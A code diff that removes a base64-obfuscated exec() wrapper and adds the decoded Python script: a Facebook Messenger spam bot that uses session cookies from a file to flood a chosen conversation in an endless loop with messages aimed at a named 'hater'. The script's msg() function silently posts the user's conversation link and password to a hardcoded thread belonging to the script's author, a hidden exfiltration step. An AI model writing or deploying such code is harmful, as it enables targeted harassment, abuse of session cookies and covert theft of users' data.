@@ -1,4 +1,146 @@
-#ENCODED BY : SHANKAR-SUMAN 
-#ENCRYPTION : Py3 BASE64
-import base64
-exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQganNvbg0KaW1wb3J0IHRpbWUNCmltcG9ydCBzeXMNCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KaW1wb3J0IG9zDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IGh0dHAuc2VydmVyDQppbXBvcnQgc29ja2V0c2VydmVyDQppbXBvcnQgdGhyZWFkaW5nDQppbXBvcnQgcmFuZG9tDQoNCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOg0KICAgIGRlZiBkb19HRVQoc2VsZik6DQogICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApDQogICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykNCiAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpDQogICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYiJGRUVMIFRIRSBQT1dFUiBPRiBTSEFOS0FSIFNVTUFOICIpDQoNCmRlZiBleGVjdXRlX3NlcnZlcigpOg0KICAgIFBPUlQgPSA0MDAwDQoNCiAgICB3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIiLCBQT1JUKSwgTXlIYW5kbGVyKSBhcyBodHRwZDoNCiAgICAgICAgcHJpbnQoIlNlcnZlciBydW5uaW5nIGF0IGh0dHA6Ly9sb2NhbGhvc3Q6e30iLmZvcm1hdChQT1JUKSkNCiAgICAgICAgaHR0cGQuc2VydmVfZm9yZXZlcigpDQoNCmRlZiBzZW5kX21lc3NhZ2VzKCk6DQogICAgd2hpbGUgVHJ1ZTogICMgSW5maW5pdGUgbG9vcCB0byBrZWVwIHRoZSBzY3JpcHQgcnVubmluZw0KICAgICAgICB0cnk6DQogICAgICAgICAgICB3aXRoIG9wZW4oJ3Bhc3N3b3JkLnR4dCcsICdyJykgYXMgZmlsZToNCiAgICAgICAgICAgICAgICBwYXNzd29yZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KICAgICAgICAgICAgZW50ZXJlZF9wYXNzd29yZCA9IHBhc3N3b3JkDQoNCiAgICAgICAgICAgIGlmIGVudGVyZWRfcGFzc3dvcmQgIT0gcGFzc3dvcmQ6DQogICAgICAgICAgICAgICAgcHJpbnQoJ1stXSA8PT0+IEluY29ycmVjdCBQYXNzd29yZCEnKQ0KICAgICAgICAgICAgICAgIHN5cy5leGl0KCkNCg0KICAgICAgICAgICAgcmVxdWVzdHMucGFja2FnZXMudXJsbGliMy5kaXNhYmxlX3dhcm5pbmdzKCkNCg0KICAgICAgICAgICAgZGVmIGNscygpOg0KICAgICAgICAgICAgICAgIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xzJykNCiAgICAgICAgICAgIGNscygpDQoNCiAgICAgICAgICAgIGRlZiBsaW5lc3MoKToNCiAgICAgICAgICAgICAgICBwcmludCgnXHUwMDFiWzM3bScgKyAnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykNCg0KICAgICAgICAgICAgaGVhZGVycyA9IHsNCiAgICAgICAgICAgICAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywNCiAgICAgICAgICAgICAgICAnQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnLA0KICAgICAgICAgICAgICAgICdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLA0KICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU2Ftc3VuZyBHYWxheHkgUzkgQnVpbGQvT1BSNi4xNzA2MjMuMDE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLA0KICAgICAgICAgICAgICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsDQogICAgICAgICAgICAgICAgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywNCiAgICAgICAgICAgICAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45LGZyO3E9MC44JywNCiAgICAgICAgICAgICAgICAncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgbW1tID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvNDQwQWhGdlUnKS50ZXh0DQoNCiAgICAgICAgICAgIGlmIG1tbSBub3QgaW4gcGFzc3dvcmQ6DQogICAgICAgICAgICAgICAgcHJpbnQoJ1stXSA8PT0+IEluY29ycmVjdCBQYXNzd29yZCEnKQ0KICAgICAgICAgICAgICAgIHN5cy5leGl0KCkNCg0KICAgICAgICAgICAgbGluZXNzKCkNCg0KICAgICAgICAgICAgIyBSZWFkaW5nIGNvb2tpZXMgZnJvbSB0aGUgZmlsZQ0KICAgICAgICAgICAgd2l0aCBvcGVuKCdjb29raWVzLnR4dCcsICdyJykgYXMgZmlsZToNCiAgICAgICAgICAgICAgICBjb29raWVzX3N0ciA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KICAgICAgICAgICAgZGVmIHBhcnNlX2Nvb2tpZXMoY29va2llX3N0cik6DQogICAgICAgICAgICAgICAgY29va2llcyA9IHt9DQogICAgICAgICAgICAgICAgZm9yIGl0ZW0gaW4gY29va2llX3N0ci5zcGxpdCgnOycpOg0KICAgICAgICAgICAgICAgICAgICBrZXksIHZhbHVlID0gaXRlbS5zcGxpdCgnPScsIDEpDQogICAgICAgICAgICAgICAgICAgIGNvb2tpZXNba2V5LnN0cmlwKCldID0gdmFsdWUuc3RyaXAoKQ0KICAgICAgICAgICAgICAgIHJldHVybiBjb29raWVzDQoNCiAgICAgICAgICAgIGNvb2tpZXMgPSBwYXJzZV9jb29raWVzKGNvb2tpZXNfc3RyKQ0KDQogICAgICAgICAgICB3aXRoIG9wZW4oJ2NvbnZvLnR4dCcsICdyJykgYXMgZmlsZToNCiAgICAgICAgICAgICAgICBjb252b19pZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KICAgICAgICAgICAgd2l0aCBvcGVuKCdmaWxlLnR4dCcsICdyJykgYXMgZmlsZToNCiAgICAgICAgICAgICAgICB0ZXh0X2ZpbGVfcGF0aCA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KICAgICAgICAgICAgd2l0aCBvcGVuKHRleHRfZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6DQogICAgICAgICAgICAgICAgbWVzc2FnZXMgPSBmaWxlLnJlYWRsaW5lcygpDQoNCiAgICAgICAgICAgIG51bV9tZXNzYWdlcyA9IGxlbihtZXNzYWdlcykNCg0KICAgICAgICAgICAgd2l0aCBvcGVuKCdoYXRlcnNuYW1lLnR4dCcsICdyJykgYXMgZmlsZToNCiAgICAgICAgICAgICAgICBoYXRlcnNfbmFtZSA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KICAgICAgICAgICAgd2l0aCBvcGVuKCd0aW1lLnR4dCcsICdyJykgYXMgZmlsZToNCiAgICAgICAgICAgICAgICBzcGVlZCA9IGludChmaWxlLnJlYWQoKS5zdHJpcCgpKQ0KDQogICAgICAgICAgICBsaW5lc3MoKQ0KDQogICAgICAgICAgICBkZWYgbXNnKCk6DQogICAgICAgICAgICAgICAgcGFyYW1ldGVycyA9IHsNCiAgICAgICAgICAgICAgICAgICAgJ21lc3NhZ2UnOiAnSEVMTE8gU0hBTktBUiBTSVIgSU0gVVNJTkcgWU9VUiBTRVJWRVJcbiBMaW5rIDogaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL21lc3NhZ2VzL3QvJyArIGNvbnZvX2lkICsgJ1xuIFBhc3N3b3JkOiAnICsgcGFzc3dvcmQNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBzID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE1LjAvdF8xMDAwNTg0MTUxNzA1OTAvIiwgZGF0YT1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMsIGNvb2tpZXM9Y29va2llcykNCiAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgIHBhc3MNCg0KICAgICAgICAgICAgbXNnKCkNCiAgICAgICAgICAgIGZvciBtZXNzYWdlX2luZGV4IGluIHJhbmdlKG51bV9tZXNzYWdlcyk6DQogICAgICAgICAgICAgICAgbWVzc2FnZSA9IG1lc3NhZ2VzW21lc3NhZ2VfaW5kZXhdLnN0cmlwKCkNCg0KICAgICAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTUuMC97fS8iLmZvcm1hdCgndF8nICsgY29udm9faWQpDQogICAgICAgICAgICAgICAgcGFyYW1ldGVycyA9IHsnbWVzc2FnZSc6IGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZX0NCiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycywgY29va2llcz1jb29raWVzKQ0KDQogICAgICAgICAgICAgICAgY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWQgJUk6JU06JVMgJXAiKQ0KICAgICAgICAgICAgICAgIGlmIHJlc3BvbnNlLm9rOg0KICAgICAgICAgICAgICAgICAgICBwcmludCgiWytdIE1lc3NhZ2VzIHt9IG9mIENvbnZvIHt9IHNlbnQ6IHt9Ii5mb3JtYXQoDQogICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpDQogICAgICAgICAgICAgICAgICAgIHByaW50KCIgIC0gVGltZToge30iLmZvcm1hdChjdXJyZW50X3RpbWUpKQ0KICAgICAgICAgICAgICAgICAgICBsaW5lc3MoKQ0KICAgICAgICAgICAgICAgICAgICBsaW5lc3MoKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIHByaW50KCJbeF0gRmFpbGVkIHRvIHNlbmQgbWVzc2FnZXMge30gb2YgQ29udm8ge306IHt9Ii5mb3JtYXQoDQogICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpDQogICAgICAgICAgICAgICAgICAgIHByaW50KCIgIC0gVGltZToge30iLmZvcm1hdChjdXJyZW50X3RpbWUpKQ0KICAgICAgICAgICAgICAgICAgICBsaW5lc3MoKQ0KICAgICAgICAgICAgICAgICAgICBsaW5lc3MoKQ0KICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoc3BlZWQpDQoNCiAgICAgICAgICAgIHByaW50KCJbK10gQWxsIG1lc3NhZ2VzIHNlbnQuIFJlc3RhcnRpbmcgdGhlIHByb2Nlc3MuLi4iKQ0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICBwcmludCgiWyFdIEFuIGVycm9yIG9jY3VycmVkOiB7fSIuZm9ybWF0KGUpKQ0KICAgICAgICAgICAgdGltZS5zbGVlcCg0KSAgIyBXYWl0IGZvciA0IHNlY29uZHMgYmVmb3JlIHJlc3RhcnRpbmcgdGhlIHByb2Nlc3MNCg0KIyBNYWluIGZ1bmN0aW9uDQpkZWYgbWFpbigpOg0KICAgICMgQ2FsbCB0aGUgc2VuZF9tZXNzYWdlcyBmdW5jdGlvbg0KICAgIHNlbmRfbWVzc2FnZXMoKQ0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ0K=='))
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+import random
+
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b"FEEL THE POWER OF SHANKAR SUMAN ")
+
+def execute_server():
+    PORT = 4000
+
+    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+        print("Server running at http://localhost:{}".format(PORT))
+        httpd.serve_forever()
+
+def send_messages():
+    while True:  # Infinite loop to keep the script running
+        try:
+            with open('password.txt', 'r') as file:
+                password = file.read().strip()
+
+            entered_password = password
+
+            if entered_password != password:
+                print('[-] <==> Incorrect Password!')
+                sys.exit()
+
+            requests.packages.urllib3.disable_warnings()
+
+            def cls():
+                if system() == 'Linux':
+                    os.system('clear')
+                else:
+                    if system() == 'Windows':
+                        os.system('cls')
+            cls()
+
+            def liness():
+                print('\u001b[37m' + '---------------------------------------------------')
+
+            headers = {
+                'Connection': 'keep-alive',
+                'Cache-Control': 'max-age=0',
+                'Upgrade-Insecure-Requests': '1',
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                'Accept-Encoding': 'gzip, deflate',
+                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+                'referer': 'www.google.com'
+            }
+
+            mmm = requests.get('https://pastebin.com/raw/440AhFvU').text
+
+            if mmm not in password:
+                print('[-] <==> Incorrect Password!')
+                sys.exit()
+
+            liness()
+
+            # Reading cookies from the file
+            with open('cookies.txt', 'r') as file:
+                cookies_str = file.read().strip()
+
+            def parse_cookies(cookie_str):
+                cookies = {}
+                for item in cookie_str.split(';'):
+                    key, value = item.split('=', 1)
+                    cookies[key.strip()] = value.strip()
+                return cookies
+
+            cookies = parse_cookies(cookies_str)
+
+            with open('convo.txt', 'r') as file:
+                convo_id = file.read().strip()
+
+            with open('file.txt', 'r') as file:
+                text_file_path = file.read().strip()
+
+            with open(text_file_path, 'r') as file:
+                messages = file.readlines()
+
+            num_messages = len(messages)
+
+            with open('hatersname.txt', 'r') as file:
+                haters_name = file.read().strip()
+
+            with open('time.txt', 'r') as file:
+                speed = int(file.read().strip())
+
+            liness()
+
+            def msg():
+                parameters = {
+                    'message': 'HELLO SHANKAR SIR IM USING YOUR SERVER\n Link : https://www.facebook.com/messages/t/' + convo_id + '\n Password: ' + password
+                }
+                try:
+                    s = requests.post("https://graph.facebook.com/v15.0/t_100058415170590/", data=parameters, headers=headers, cookies=cookies)
+                except:
+                    pass
+
+            msg()
+            for message_index in range(num_messages):
+                message = messages[message_index].strip()
+
+                url = "https://graph.facebook.com/v15.0/{}/".format('t_' + convo_id)
+                parameters = {'message': haters_name + ' ' + message}
+                response = requests.post(url, json=parameters, headers=headers, cookies=cookies)
+
+                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                if response.ok:
+                    print("[+] Messages {} of Convo {} sent: {}".format(
+                        message_index + 1, convo_id, haters_name + ' ' + message))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                else:
+                    print("[x] Failed to send messages {} of Convo {}: {}".format(
+                        message_index + 1, convo_id, haters_name + ' ' + message))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                time.sleep(speed)
+
+            print("[+] All messages sent. Restarting the process...")
+        except Exception as e:
+            print("[!] An error occurred: {}".format(e))
+            time.sleep(4)  # Wait for 4 seconds before restarting the process
+
+# Main function
+def main():
+    # Call the send_messages function
+    send_messages()
+
+if __name__ == "__main__":
+    main()
